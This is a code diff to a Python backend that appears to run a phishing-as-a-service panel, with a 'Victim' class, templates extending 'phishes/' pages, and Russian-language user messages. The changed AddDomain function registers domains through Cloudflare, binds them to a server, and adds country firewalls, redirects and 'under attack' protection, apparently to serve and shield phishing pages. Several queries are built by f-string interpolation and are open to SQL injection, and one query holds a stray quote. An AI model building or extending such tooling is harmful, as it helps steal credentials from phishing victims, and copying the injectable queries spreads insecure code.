@@ -2,8 +2,8 @@ from peewee import SqliteDatabase
 from datetime import datetime
 from os import mkdir
 from shutil import rmtree
-from config import clf
-
+from config import clf, server_domain
+import json
 
 class User:
 
@@ -65,7 +65,11 @@ class User:
                     "servers"	TEXT,
                     "template"	TEXT,
                     "status"	TEXT,
-                    "views"	INTEGER DEFAULT 0,
+                    "security"	TEXT,
+                    "redirect"	TEXT,
+                    "redirect_on_success"	TEXT,
+                    "countries"	TEXT,
+                    "views"	REAL DEFAULT 0,
                     "logsReceived"	INTEGER DEFAULT 0,
                     "created_on"	DATETIME
                 );
@@ -119,24 +123,61 @@ class Victim:
             return data
         
 
-    def AddDomain(self, domain, page, path, redirect, countries, username):
+    def CheckDomain(self, domain):
+        with SqliteDatabase(self.database_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute(f"SELECT * FROM domains WHERE domain = '{domain}'")
+            conn.commit()
+            data = cursor.fetchall()
+            return data
+
+    
+
+    def GetRedirect(self):
+        with SqliteDatabase(self.database_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute(f"SELECT redirect FROM domains'")
+            conn.commit()
+            data = cursor.fetchall()
+            return data
+
+
+
+
+
+
+
+
+
+
+    def AddDomain(self, domain, page, path, security, redirect, countries, redirect_on_success, username):
         added_domain = clf.AddDomain(domain)
         if added_domain:
-            zones = clf.getDomains()
-            for zone in zones:
-                if zone == domain:
-                    zone_id = zone['id']
-                    status = zone['status']
-                    name_servers = zone['name_servers']
+            data = json.loads(added_domain)
+            zone_id = data['result']['id']
+            status = data['result']['status']
+            ns_servers = ', '.join(data['result']['name_servers'])
+            countries_db = ', '.join(countries)
 
-                    with SqliteDatabase(self.database_path) as conn:
-                        cursor = conn.cursor()
-                        cursor.execute(f"INSERT INTO domains(domain, zone_id, servers, status, template, created_on) VALUES('{domain}', '{zone_id}', '{name_servers}', '{status}', '{page}', {datetime.utcnow()}) WHERE username = '{username}'")
-                        conn.commit()
-                        mkdir(f"users/{username}/websites/{domain}")
-                        f = open(f"users/{username}/websites/{domain}/index.html", 'w')
-                        f.close()
-                        return True
-            return False
+            with SqliteDatabase(self.database_path) as conn:
+                cursor = conn.cursor()
+                cursor.execute(f"""
+                    INSERT INTO domains(domain, servers, template, status, security, redirect, redirect_on_success, countries, created_on)
+                    VALUES('{domain+'/'+path}', '{ns_servers}', '{page}', '{status}', '{security}', '{redirect}', '{redirect_on_success}', {countries_db}, {datetime.utcnow()})
+                """)
+                conn.commit()
+                mkdir(f"templates/domains/{domain}${path}/")
+                f = open(f"templates/domains/{domain}${path}/{username}.html", 'w')
+                f.write("{% extends 'phishes/" + page + "/index.html' %}")
+                f.close()
+
+                if clf.BindDomain(zone_id, domain, server_domain):
+                    clf.CountryFirewall(zone_id, countries)
+                    if security == 'true':
+                        clf.SetUnderAttack(zone_id)
+                    return [True, 'Домен успешно добавлен']
+                else:
+                    return [False, 'Что-то пошло не так, свяжитесь с админом']
+        
         else:
-            return False
+            return [False, 'Этот домен добавлен уже добавлен другим пользователем, обратитесь в поддержку']
